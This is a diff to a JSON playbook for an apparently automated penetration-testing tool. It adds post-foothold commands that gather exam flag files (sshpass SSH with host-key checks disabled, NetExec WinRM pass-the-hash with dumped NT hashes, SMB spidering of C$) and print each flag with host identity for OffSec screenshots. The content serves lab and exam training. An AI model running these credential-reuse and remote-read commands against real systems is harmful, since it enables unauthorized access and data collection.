@@ -1,10 +1,10 @@
 {
   "name": "obol_flag_hunt_2026_09",
-  "description": "Thorough post-foothold flag capture. Reads well-known flag files through the existing SSH/WinRM proof channel and records what it actually reads.",
+  "description": "Thorough post-foothold flag capture. Reads well-known flag files through the existing SSH/WinRM proof channel, prints each flag next to a host-identity command (for the exam screenshot), and records what it actually reads.",
   "source": {
     "name": "O.B.O.L flag capture methodology",
     "license": "project",
-    "notes": "Runs a single non-interactive recursive search per OS over an existing proven foothold; a captured flag is proof, not a checkbox."
+    "notes": "Runs a single non-interactive recursive search per OS over an existing proven foothold; a captured flag is proof, not a checkbox. Each flag is printed with its own identity block so one screenshot per flag satisfies OffSec's flag+ipconfig requirement."
   },
   "actions": [
     {
@@ -30,7 +30,12 @@
       "commands": [
         {
           "tool": "sshpass",
-          "note": "Thoroughly search the filesystem for the well-known flag files and print each as path:content over the existing non-interactive SSH channel.",
+          "note": "Find every flag file and print each with its OWN identity block — hostname + ip addr, then ===FLAG:path::content — so obol records it and one screenshot per flag shows the flag beside the host IP (OffSec's requirement). Order: locate, then read one at a time.",
+          "run": "sshpass -p {{password}} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 {{user}}@{{target}} 'for f in $(find / -xdev -type f -size -4k \\( {{flag_inames_linux}} \\) 2>/dev/null); do echo ===IDENT===; hostname; ip -4 addr 2>/dev/null || ifconfig; echo \"===FLAG:$f::$(cat \"$f\" 2>/dev/null)\"; done'"
+        },
+        {
+          "tool": "sshpass",
+          "note": "Quieter one-shot when you just want the values recorded (no per-flag identity block).",
           "run": "sshpass -p {{password}} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 {{user}}@{{target}} find / -xdev -type f -size -4k \\( {{flag_inames_linux}} \\) -exec grep -H -s . {} +"
         }
       ]
@@ -41,8 +46,12 @@
       "tool": "nxc",
       "priority": 82,
       "requires_all": [
-        "credential.available",
-        "winrm.authenticated"
+        "credential.available"
+      ],
+      "requires_any": [
+        "winrm.authenticated",
+        "access.admin",
+        "foothold.windows"
       ],
       "os": [
         "windows"
@@ -50,7 +59,7 @@
       "produces": [
         "objective.flag"
       ],
-      "hypothesis": "A Windows WinRM foothold should be able to read the engagement flag files; capturing their contents proves the objective.",
+      "hypothesis": "A Windows foothold should be able to read the engagement flag files; capturing their contents proves the objective, and printing each next to ipconfig gives the exam screenshot.",
       "report": {
         "finding": "Captured a flag file from the Windows foothold.",
         "severity": "high"
@@ -58,13 +67,18 @@
       "commands": [
         {
           "tool": "nxc",
-          "note": "Recursively search user profiles for the well-known flag files and print each as ===FLAG:path::content through WinRM PowerShell so output is captured and parsed like every other run.",
-          "run": "nxc winrm {{target}} -u {{user}} -p {{password}} -X \"foreach($f in Get-ChildItem -Path C:\\Users -Recurse -Force -Include {{flag_names_windows}} -File -ErrorAction SilentlyContinue){Write-Output ('===FLAG:'+$f.FullName+'::'+(Get-Content -Raw -LiteralPath $f.FullName -ErrorAction SilentlyContinue))}\""
+          "note": "PREFERRED, pass-the-hash: for EACH flag file it prints its own identity block (hostname + ipconfig) then ===FLAG:path::content. obol parses the markers into the report, and each flag ends up beside the host IP in the output — screenshot them one at a time for OffSec. -H passes the dumped hash; no plaintext needed.",
+          "run": "nxc winrm {{target}} -u {{user}} -H {{nthash}} -X \"Get-ChildItem -Path C:\\Users -Recurse -Force -Include {{flag_names_windows}} -File -ErrorAction SilentlyContinue | ForEach-Object { Write-Output '===IDENT==='; hostname; ipconfig; Write-Output ('===FLAG:'+$_.FullName+'::'+(Get-Content -Raw -LiteralPath $_.FullName -ErrorAction SilentlyContinue)) }\""
         },
         {
           "tool": "nxc",
-          "note": "Pass-the-hash form — when you own the account by NT hash (e.g. Administrator straight from a DCSync dump) and have no plaintext. -H takes the hash; everything else is identical.",
-          "run": "nxc winrm {{target}} -u {{user}} -H {{nthash}} -X \"foreach($f in Get-ChildItem -Path C:\\Users -Recurse -Force -Include {{flag_names_windows}} -File -ErrorAction SilentlyContinue){Write-Output ('===FLAG:'+$f.FullName+'::'+(Get-Content -Raw -LiteralPath $f.FullName -ErrorAction SilentlyContinue))}\""
+          "note": "Password form of the same per-flag capture (use when you hold the plaintext instead of the hash).",
+          "run": "nxc winrm {{target}} -u {{user}} -p {{password}} -X \"Get-ChildItem -Path C:\\Users -Recurse -Force -Include {{flag_names_windows}} -File -ErrorAction SilentlyContinue | ForEach-Object { Write-Output '===IDENT==='; hostname; ipconfig; Write-Output ('===FLAG:'+$_.FullName+'::'+(Get-Content -Raw -LiteralPath $_.FullName -ErrorAction SilentlyContinue)) }\""
+        },
+        {
+          "tool": "nxc",
+          "note": "LOCATE FIRST over SMB (no shell) — spider C$ for the flag files so you know which user's Desktop holds each before you WinRM in. Handy when WinRM is closed, or to confirm the paths, then run the capture command above.",
+          "run": "nxc smb {{target}} -u {{user}} -H {{nthash}} --spider C$ --regex \"(local|proof|user|root|flag)\\.txt\""
         }
       ]
     }
